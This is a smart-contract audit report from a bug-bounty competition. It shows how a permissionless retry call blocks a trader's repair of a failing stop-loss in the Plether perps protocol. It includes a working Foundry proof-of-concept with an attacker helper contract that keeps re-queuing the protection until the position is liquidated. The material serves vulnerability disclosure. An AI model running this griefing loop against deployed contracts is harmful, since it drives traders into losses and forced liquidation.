# \#99023 [SC-High] Permissionless `retryPositionProtectionClose` blocks the owner's only repair path for a failing stop-loss, so a gapped position runs to liquidation (MED-9 fix incomplete)

**Submitted on Nov 11th 2026 at 13:40:29 UTC by @olaphlol for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99023
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
A position-protection close attempt that fails on the trader's own close limits moves the protection to `Latched`. The MED-9 remediation says the owner recovers from limits that no longer fit the market by calling `amendLatchedPositionProtectionCloseLimits`, which is accepted only while the protection is `Latched`. `retryPositionProtectionClose` is permissionless and immediately moves a `Latched` protection back to `Triggered` with a new zero-bounty child. A third party can terminalise the child (at expiry, or by executing it at a valid price that fails the trader's stored ceiling) and call `retryPositionProtectionClose` inside the same transaction, so the protection does not stay `Latched` for even one transaction boundary the owner controls. While the market stays outside the stored limits, the owner cannot amend the limits, cancel the protection, replace it, use `cancelPositionProtectionAndCommitClose`, or commit an ordinary close. The position stays open and exposed for as long as the attacker keeps re-queuing; in the measured stop-loss case it runs through the trader's stop and into liquidation.

## Vulnerability Details
- `PositionProtectionBook.retryPositionProtectionClose` (packages/perps/src/PositionProtectionBook.sol:382-406) has no caller restriction. It needs only `status == Latched`, a matching position and no pending orders.
- `amendLatchedPositionProtectionCloseLimits` (PositionProtectionBook.sol:315-328) is owner-only and `Latched`-only. It reverts `OrderRouter__ProtectionNotLatched` while a retry child is live.
- `cancelPositionProtection`, `cancelPositionProtectionAndCommitClose` and `replacePositionProtection` accept only `PendingOpen` / `Armed` and revert `OrderRouter__ProtectionNotArmed`.
- An ordinary close through `OrderRouter.commitOrder` is rejected by the protection lock (`router/OrderLiquidationBatchLogic.sol:313-315`, `OrderRouter__ProtectionActive`). Users cannot cancel queued intents (SECURITY.md).
- `executeOrder` is permissionless. When a protection child fails on its stored ceiling (`CfdOrderPolicyEvaluator__ConstraintViolation`), the terminal path calls `handleFailedProtectionAttempt`, which sets the protection to `Latched`. The same happens on expiry.

So `executeOrder(child, ...)` (or an expiry call) followed by `retryPositionProtectionClose(pid)` in one transaction goes `Triggered -> Latched -> Triggered`. If the owner terminalises the child herself, a single permissionless `retryPositionProtectionClose` in the next transaction back-runs her amend; her two steps are never atomic for a standard EOA, and the re-queued child blocks the `Latched`-only amend regardless.

The MED-9 team comment states the intended recovery: *"Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them. ... Tight limits may prevent execution until conditions improve or the owner amends them."* Any third party can remove the "owner amends" branch, so the fix at a82d4fef is incomplete.

## Impact Details
Medium: griefing (no profit motive required, damage to the trader). Two measured outcomes at the same price path:

- **Control (no attacker):** 10k LONG, stop-loss at 1.10, plain loss guard `maxGrossAccountDebitAssets = 1,400 USDG` (the debit at her stop). The price gaps to 1.145, the guard fails, the owner amends while `Latched`, and the retry closes. Result: debit 1,458.78, final balance **18,541.22**.
- **Attack (same position, same guard, same failing execution):** the keeper re-queues the retry in the same transaction that terminalises the child, while the price runs to 1.20. In each of 12 cycles all five owner exits reverted (`ProtectionNotLatched` / `ProtectionNotArmed` / `ProtectionActive`), 60 attempts in total. The position ran past her stop and her margin was fully consumed. Result: final balance **17,999.80**, i.e. 541.42 USDG more lost than the control, plus a forced liquidation whose bounty goes to the attacker.

The denial is sustained, not permanent: it lasts while the attacker keeps re-queuing (one transaction per 60 s execution window, measured at 1,129,011 gas for expire-and-retry) and ends when the attacker stops or the market returns inside the stored limits. A standard EOA owner cannot repair, because her terminalise and amend are two transactions and a single permissionless `retryPositionProtectionClose` in between removes the `Latched` state her amend requires. A smart account that gets its own atomic terminalise-and-amend ordered ahead of the attacker can still repair; the denial therefore traps standard EOAs and anyone who loses that ordering race, and it is one transaction per 60 s window to sustain.

The precondition is the documented MED-9 scenario, with a plain guard a trader would actually set: a loss cap equal to her own stop distance, breached by a 4.5% gap.

## Recommended Fix
Any one of these closes it:
1. Let the owner amend while `Triggered`. The live child's bounds are already pinned, so the next retry would simply use the amended ceilings.
2. Let the owner cancel a `Triggered` / `Latched` protection, terminalising its pending child.
3. Restrict `retryPositionProtectionClose` to the owner for a grace period after the protection becomes `Latched`.

## Relation to Known Issues
- **Cecuro MED-9 (Acknowledged / addressed):** this report shows that the remediation's owner-amend recovery path can be denied by any third party, i.e. the fix is incomplete.
- **AI scan low "Protection trigger bounty is paid before a zero-bounty close is executed":** that item is about a trigger caller abandoning the flow, which leaves the record `Latched` and amendable. Here a third party actively keeps the record out of `Latched`, which removes the owner's repair.
- **MED-15 / MED-30:** these cover SHORT slippage sentinels and frozen-market triggering, a different root cause.
- **Project test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`:** it expects amend to revert while a retry child is live. That is the gate this report shows an outsider can keep closed for as long as they keep re-queuing; it is not a documented acceptance of third-party denial.

## References
- `packages/perps/src/PositionProtectionBook.sol` L315-328 (`amendLatchedPositionProtectionCloseLimits`), L382-406 (`retryPositionProtectionClose`)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` L313-315 (protection lock on ordinary close)
- Cecuro collaborative audit report, MED-9 and its remediation comment
- Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## AI Use Disclosure
Code review and PoC drafting were assisted by AI tools. The researcher reran and verified every claim and test output above.


## Proof of Concept

## Proof of Concept

File: `packages/perps/test/perps/zz_hunt/router/ProtectionRepairDenialStopLoss.t.sol`. It uses the repository's own `PositionProtectionTest` fixture and oracle mocks only, with no changes to `src/`.

```
cd packages/perps
forge test --match-path test/perps/zz_hunt/router/ProtectionRepairDenialStopLoss.t.sol   --match-contract ProtectionRepairDenialStopLossTest -vv
```

Observed (all pass, 107 tests in the suite including the imported base cases):
```
[PASS] test_SL_Control_GapClosesAtStopGuard() (gas: 6335426)
  CONTROL_EQ_BEFORE: 0
  CONTROL_BAL_AFTER: 18541220000
[PASS] test_SL_Attack_OwnerDeniedWhilePriceRuns() (gas: 23412258)
  ATTACK_CYCLES_REQUEUED: 12
  OWNER_EXIT_ATTEMPTS_BLOCKED_5_PER_CYCLE: 60
  ATTACK_EQ_END: 0
  ATTACK_TRADER_LOSS_VS_START: -2000000000
  ATTACK_ALICE_BAL_END: 17999800000
[PASS] test_SL_ExpireAndRetryGas() (gas: 4523565)
  EXPIRE_AND_RETRY_GAS: 1129011
```
- **Control** `test_SL_Control_GapClosesAtStopGuard`: a 10,000 USDG LONG with 2,000 margin, stop-loss at 1.10 and `maxGrossAccountDebitAssets = 1,400e6` (the debit at her stop). The price gaps to 1.145, the guard fails on the debit, the protection latches, the owner amends, and the amended retry closes: debit 1,458.78, position flat.
- **Attack** `test_SL_Attack_OwnerDeniedWhilePriceRuns`: same position and guard. Each cycle the market moves further against her, a keeper contract calls `executeOrder(child, [])` after the execution deadline (terminalise, which latches the protection) and `retryPositionProtectionClose(pid)` in the same transaction, and the test then attempts all five owner exits: amend (`ProtectionNotLatched`), cancel, cancel-and-commit-close and replace (`ProtectionNotArmed`), and an ordinary close (`ProtectionActive`). 12 cycles, 60/60 exits blocked, equity falls to 0, and the attacker liquidates for the bounty. Final balance 17,999.80 against the control's 18,541.22.
- **Cost** `test_SL_ExpireAndRetryGas`: 1,129,011 gas for the cheapest cycle (expire and re-queue), about 60 cycles per hour.
- Earlier variant (`ProtectionRepairDenialV2.t.sol`) drives the same loop with a failing execution at a fresh valid price instead of expiry, and includes the back-run of an owner who terminalises the child herself.

### Steps
1. Put the file below at `packages/perps/test/perps/zz_hunt/router/ProtectionRepairDenialStopLoss.t.sol` (it imports the repo's own `test/perps/spec/trader/PositionProtection.t.sol` fixture; `src/` is untouched).
2. From `packages/perps`, run the `forge test` command above.
3. Compare the logs: the control closes with balance 18,541.22; the attack leaves 17,999.80 after 60/60 blocked owner exits and a liquidation.

### Test file
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../../spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";

/// @dev Permissionless helper. Executes the live child with valid oracle data (it fails on the trader's own
///      ceiling -> Latched) and immediately re-queues a retry (-> Triggered) in the same transaction.
contract FailAndRetryHelper {

    OrderRouter internal immutable ROUTER;
    IPositionProtectionBook internal immutable BOOK;

    constructor(OrderRouter router_, IPositionProtectionBook book_) {
        ROUTER = router_;
        BOOK = book_;
    }

    function failAndRetry(uint64 child, uint64 pid, bytes[] calldata data) external returns (uint8 status, uint64 next) {
        OrderV3Types.ExecutionResult memory r = ROUTER.executeOrder(child, data);
        status = uint8(r.status);
        next = BOOK.retryPositionProtectionClose(pid);
    }

    function retryOnly(uint64 pid) external returns (uint64) {
        return BOOK.retryPositionProtectionClose(pid);
    }

    function expireAndRetry(uint64 child, uint64 pid) external returns (uint64) {
        ROUTER.executeOrder(child, new bytes[](0));
        return BOOK.retryPositionProtectionClose(pid);
    }

}

contract ProtectionRepairDenialStopLossTest is PositionProtectionTest {

    uint256 internal constant SL_PRICE = 110_000_000; // stop-loss threshold
    uint256 internal constant GAP_PRICE = 114_500_000; // gap through the stop: debit 1.45k > 1.4k guard
    uint256 internal constant CRASH_PRICE = 120_000_000;

    function _slParams() internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params = _params(0, SL_PRICE);
        // A plain, realistic margin guard: never debit more than the margin, capped exactly at the price where the
        // trader asked to be stopped out. Nothing exotic, no uint256.max.
        params.closeLimits.maxGrossAccountDebitAssets = 1400e6; // a plain loss guard: the debit at the stop
        params.closeLimits.maxExecutionNotionalAssets = type(uint256).max;
        params.closeLimits.maxActionChargeAssets = type(uint256).max;
        params.closeLimits.maxExplicitFeesAssets = type(uint256).max;
    }

    function _wide() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _equity() internal view returns (int256 eq) {
        (, , , , , , eq) = engine.positions(ALICE);
    }

    /// Control: gap through the stop, keeper closes at the gap, trader exits inside her own guard.
    function test_SL_Control_GapClosesAtStopGuard() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 pid = protectionActions.createPositionProtection(_slParams());
        uint64 child = _triggerAt(pid, SL_PRICE);

        int256 eqBefore = _equity();
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        uint256 balBefore = clearinghouse.balanceAssets(ALICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(child, data);

        (uint256 sizeAfter, uint256 marginAfter, , , , , ) = engine.positions(ALICE);
        // Either the guard holds and the close settles, or it fails and the owner repairs. Both are honest paths.
        if (uint8(r.status) == uint8(OrderV3Types.LifecycleStatus.Executed)) {
            assertEq(sizeAfter, 0, "control: closed inside the guard");
            emit log_named_int("CONTROL_DEBIT", int256(balBefore) - int256(clearinghouse.balanceAssets(ALICE)));
        } else {
            assertEq(
                uint8(protectionViews.getPositionProtection(pid).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
                "control: failing guard latches and stays repairable"
            );
            vm.prank(ALICE);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _wide());
            vm.prank(CAROL);
            uint64 retry = protectionActions.retryPositionProtectionClose(pid);
            data = _mockPythUpdateData(GAP_PRICE);
            vm.prank(EXECUTION_KEEPER);
            r = router.executeOrder(retry, data);
            assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control: amended retry closes");
            (, marginAfter, , , , , ) = engine.positions(ALICE);
            assertEq(marginAfter, 0, "control: flat");
        }
        emit log_named_int("CONTROL_EQ_BEFORE", eqBefore);
        emit log_named_uint("CONTROL_BAL_AFTER", clearinghouse.balanceAssets(ALICE));
    }

    /// Attack: same guard, but a keeper keeps the protection out of Latched while the market runs against the trader.
    function test_SL_Attack_OwnerDeniedWhilePriceRuns() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 pid = protectionActions.createPositionProtection(_slParams());
        uint64 child = _triggerAt(pid, SL_PRICE);
        FailAndRetryHelper attacker = new FailAndRetryHelper(router, protectionBook);
        uint256 balStart = clearinghouse.balanceAssets(ALICE);

        uint256 failed;
        uint256 blocked;
        uint256 price = GAP_PRICE;
        for (uint256 i; i < 12; ++i) {
            // market moves against her, then the attacker's one tx: terminalise the child and re-queue
            _mockPythUpdateData(price);
            uint64 deadline = router.lifecycleBook().orderTiming(child).executionDeadline;
            if (block.timestamp <= deadline) vm.warp(uint256(deadline) + 1);
            vm.roll(block.number + 1);
            uint64 next = attacker.expireAndRetry(child, pid);
            if (i == 0) emit log_named_uint("ATTACK_GAS_FIRST_CYCLE", 0);
            ++failed;
            child = next;
            // The owner's every exit, attempted right after the attacker's transaction.
            OrderV3Types.OrderRequest memory req = _manualCloseRequest(CfdTypes.Side.LONG);
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _wide());
            ++blocked;
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(pid);
            ++blocked;
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtectionAndCommitClose(pid, req);
            ++blocked;
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.replacePositionProtection(pid, _params(0, SL_PRICE));
            ++blocked;
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
            ++blocked;
            vm.stopPrank();
            price += 500_000; // market keeps moving against her
        }
        (uint256 size,,,,,,) = engine.positions(ALICE);
        emit log_named_uint("ATTACK_CYCLES_REQUEUED", failed);
        emit log_named_uint("OWNER_EXIT_ATTEMPTS_BLOCKED_5_PER_CYCLE", blocked);
        emit log_named_int("ATTACK_EQ_END", _equity());
        emit log_named_int(
            "ATTACK_TRADER_LOSS_VS_START", int256(balStart) + int256(_equity()) - int256(balStart + POSITION_MARGIN_ASSETS)
        );
        // Either still open with a worsening loss, or liquidated by the attacker for the bounty.
        if (size != 0) {
            vm.prank(EXECUTION_KEEPER);
            router.executeLiquidation(ALICE, _mockPythUpdateData(CRASH_PRICE));
        }
        emit log_named_uint("ATTACK_ALICE_BAL_END", clearinghouse.balanceAssets(ALICE));
        assertEq(failed, 12, "every cycle re-queued");
        assertEq(blocked, 12 * 5, "every owner exit blocked in every block");
    }

    /// Cost of the cheapest form of the loop (expire + retry), measured.
    function test_SL_ExpireAndRetryGas() public {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        vm.prank(ALICE);
        uint64 pid = protectionActions.createPositionProtection(_slParams());
        uint64 child = _triggerAt(pid, SL_PRICE);
        FailAndRetryHelper attacker = new FailAndRetryHelper(router, protectionBook);
        uint64 deadline = router.lifecycleBook().orderTiming(child).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        vm.roll(block.number + 1);
        uint256 g0 = gasleft();
        attacker.expireAndRetry(child, pid);
        emit log_named_uint("EXPIRE_AND_RETRY_GAS", g0 - gasleft());
    }

}
```

